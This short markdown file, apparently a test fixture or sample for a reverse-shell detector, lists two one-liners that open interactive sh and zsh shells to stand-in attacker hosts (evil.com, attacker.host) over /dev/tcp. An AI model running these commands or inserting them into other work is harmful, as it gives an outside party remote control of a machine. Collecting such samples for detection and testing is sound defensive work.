---
name: reverse-shell
description: reverse shell via sh/zsh and hostname (non-IP) target
---

# Reverse shells using shells other than bash and hostname targets

```
sh -i >& /dev/tcp/evil.com/4444 0>&1
zsh -i >& /dev/tcp/attacker.host/4444 0>&1
```
